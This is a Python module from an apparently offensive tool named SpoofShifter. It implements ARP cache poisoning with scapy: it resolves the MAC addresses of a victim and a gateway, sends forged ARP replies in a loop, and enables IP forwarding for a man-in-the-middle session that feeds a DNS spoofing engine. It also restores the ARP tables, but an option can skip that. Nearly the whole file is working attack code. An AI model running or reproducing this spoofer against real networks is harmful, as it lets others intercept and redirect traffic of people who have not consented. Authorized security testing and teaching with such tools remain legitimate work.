"""Optional ARP-spoofing companion.

SpoofShifter can run a full man-in-the-middle session on its own: ARP-poison
the victim and the gateway, let IP forwarding move the traffic, and the DNS
engine does the rest.

Packet construction is pure and unit-testable; ``sendp`` / ``srp1`` are the
only socket touchpoints.  ARP spoofing is Linux-only (like the rest of the
tool).
"""

from __future__ import annotations

import logging
import threading
from typing import Optional

from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import sendp, srp1

log = logging.getLogger("spoofshifter")


class ArpError(Exception):
    """Raised when ARP spoofing cannot be set up or restored."""


def get_own_mac(iface: str) -> str:
    """Return the MAC address of a local interface."""
    try:
        from scapy.arch import get_if_hwaddr
    except ImportError as exc:
        raise ArpError("could not read interface MAC addresses (Linux only)") from exc
    try:
        return get_if_hwaddr(iface)
    except Exception as exc:
        raise ArpError(f"could not get MAC address of interface {iface!r}: {exc}") from exc


def resolve_mac(ip: str, iface: str, timeout: float = 3.0, retries: int = 3) -> Optional[str]:
    """Resolve ``ip`` to a MAC address via ARP who-has requests."""
    for _ in range(retries):
        answer = srp1(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=ip),
            iface=iface,
            timeout=timeout,
            verbose=0,
        )
        if answer is not None and answer.haslayer(ARP) and answer[ARP].op == 2:
            mac = answer[ARP].hwsrc
            if mac:
                return mac
    return None


def build_spoof_packet(our_mac: str, victim_ip: str, victim_mac: str, spoofed_ip: str) -> Ether:
    """Tell ``victim_ip`` (at ``victim_mac``) that ``spoofed_ip`` is at our MAC."""
    return (
        Ether(dst=victim_mac, src=our_mac)
        / ARP(op=2, hwsrc=our_mac, psrc=spoofed_ip, hwdst=victim_mac, pdst=victim_ip)
    )


def build_restore_packet(real_mac: str, victim_ip: str, victim_mac: str, real_ip: str) -> Ether:
    """Undo a spoof: tell ``victim_ip`` the true location of ``real_ip``."""
    return (
        Ether(dst=victim_mac, src=real_mac)
        / ARP(op=2, hwsrc=real_mac, psrc=real_ip, hwdst=victim_mac, pdst=victim_ip)
    )


# -- IP forwarding ----------------------------------------------------------

_IP_FORWARD_ORIGINAL: Optional[str] = None


def enable_ip_forwarding() -> None:
    """Enable IPv4 forwarding, remembering the previous value."""
    global _IP_FORWARD_ORIGINAL
    path = "/proc/sys/net/ipv4/ip_forward"
    try:
        with open(path, "r", encoding="ascii") as fh:
            _IP_FORWARD_ORIGINAL = fh.read().strip()
        with open(path, "w", encoding="ascii") as fh:
            fh.write("1")
    except OSError as exc:
        raise ArpError(f"could not enable IP forwarding: {exc}") from exc
    log.debug("ip_forward was %r, set to 1", _IP_FORWARD_ORIGINAL)


def restore_ip_forwarding() -> None:
    """Restore the previous IP forwarding value (no-op if never enabled)."""
    global _IP_FORWARD_ORIGINAL
    if _IP_FORWARD_ORIGINAL is None:
        return
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w", encoding="ascii") as fh:
            fh.write(_IP_FORWARD_ORIGINAL)
    except OSError:
        log.warning("could not restore /proc/sys/net/ipv4/ip_forward")
    _IP_FORWARD_ORIGINAL = None


# -- Spoofer ----------------------------------------------------------------

class ArpSpoofer:
    """Periodically poisons the ARP caches of a victim and a gateway."""

    def __init__(self, iface: str, target_ip: str, gateway_ip: str, interval: float = 2.0) -> None:
        self.iface = iface
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interval = interval
        self.our_mac: Optional[str] = None
        self.target_mac: Optional[str] = None
        self.gateway_mac: Optional[str] = None
        self._thread: Optional[threading.Thread] = None
        self._stop = threading.Event()

    def setup(self) -> None:
        """Resolve our own MAC (call before start())."""
        self.our_mac = get_own_mac(self.iface)

    def start(self) -> None:
        """Resolve target/gateway MACs and begin poisoning."""
        if self.our_mac is None:
            raise ArpError("call setup() before start()")
        self.target_mac = resolve_mac(self.target_ip, self.iface)
        self.gateway_mac = resolve_mac(self.gateway_ip, self.iface)
        if not self.target_mac:
            raise ArpError(f"could not resolve MAC address for target {self.target_ip}")
        if not self.gateway_mac:
            raise ArpError(f"could not resolve MAC address for gateway {self.gateway_ip}")
        enable_ip_forwarding()
        self._stop.clear()
        self._thread = threading.Thread(target=self._run, name="arp-spoofer", daemon=True)
        self._thread.start()
        log.info(
            "[+] ARP spoofing started: %s <-> %s (iface %s)",
            self.target_ip, self.gateway_ip, self.iface,
        )

    def _run(self) -> None:
        while not self._stop.is_set():
            sendp(
                build_spoof_packet(self.our_mac, self.target_ip, self.target_mac, self.gateway_ip),
                iface=self.iface, verbose=0,
            )
            sendp(
                build_spoof_packet(self.our_mac, self.gateway_ip, self.gateway_mac, self.target_ip),
                iface=self.iface, verbose=0,
            )
            self._stop.wait(self.interval)

    def restore(self, restore_arp: bool = True) -> None:
        """Undo poisoning: restore ARP tables, stop the thread, restore IP forwarding.

        With ``restore_arp=False`` (``--no-arp-restore``) the correct-ARP
        packets are not sent - useful for headless/service use where the
        shutdown should not poke the victim and gateway.  The poison thread is
        always stopped and IP forwarding is always restored.
        """
        if restore_arp and self.target_mac and self.gateway_mac and self.our_mac:
            try:
                sendp(
                    build_restore_packet(self.gateway_mac, self.target_ip, self.target_mac, self.gateway_ip),
                    iface=self.iface, verbose=0,
                )
                sendp(
                    build_restore_packet(self.target_mac, self.gateway_ip, self.gateway_mac, self.target_ip),
                    iface=self.iface, verbose=0,
                )
                log.info("[+] ARP tables restored for %s and %s", self.target_ip, self.gateway_ip)
            except Exception:
                log.exception("failed to send ARP restore packets")
        elif not restore_arp:
            log.info("[+] ARP restore skipped (--no-arp-restore)")
        self._stop.set()
        if self._thread is not None:
            self._thread.join(timeout=2.0)
        restore_ip_forwarding()
